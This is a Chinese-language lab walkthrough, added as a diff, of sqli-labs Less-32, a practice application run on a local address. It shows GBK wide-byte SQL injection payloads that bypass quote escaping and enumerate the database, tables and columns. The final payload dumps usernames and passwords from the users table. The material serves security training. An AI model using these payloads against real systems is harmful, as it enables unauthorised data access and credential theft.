@@ -1,0 +1,36 @@
+http://10.0.2.15/sqli/Less-32/?id=0'
+显示：
+Hint: The Query String you input is escaped as : 0\'
+可以猜测代码会在'前加转义符，从而使单引号无法闭合
+于是使用宽字符注入
+http://10.0.2.15/sqli/Less-32/?id=1%df\
+报错：' '�\\' LIMIT 0,1 '
+
+推测sql：
+select 字段名 from 表名 where id = '输入的id' limit 0,1;
+
+1.字段数
+http://10.0.2.15/sqli/Less-32/?id=1%df' order by 3--+
+正常显示
+http://10.0.2.15/sqli/Less-32/?id=1%df' order by 4--+
+报错。说明字段数为3
+
+2.数据库名
+http://10.0.2.15/sqli/Less-32/?id=0%df' union select 1,database(),3--+
+数据库名：security
+
+3.表名
+http://10.0.2.15/sqli/Less-32/?id=0%df' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = database()),3--+
+表名：users,uagents,emails,referers
+
+4.字段名
+http://10.0.2.15/sqli/Less-32/
+?id=0%df' union select 1,(select group_concat(column_name) from information_schema.columns where table_name = 0x7573657273),3--+
+字段名(users十六进制0x7573657273)：
+id,username,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS
+
+5.字段值
+http://10.0.2.15/sqli/Less-32/
+?id=0%df' union select 1,(select group_concat(username,0x3a,password) from users),3--+
+字段值：
+Dumb:1,Angelina:1,Dummy:1,secure:1,stupid:1,superman:1,batman:1,admin:123,admin1:1,admin2:1,admin3:1,dhakkan:1,admin4:1
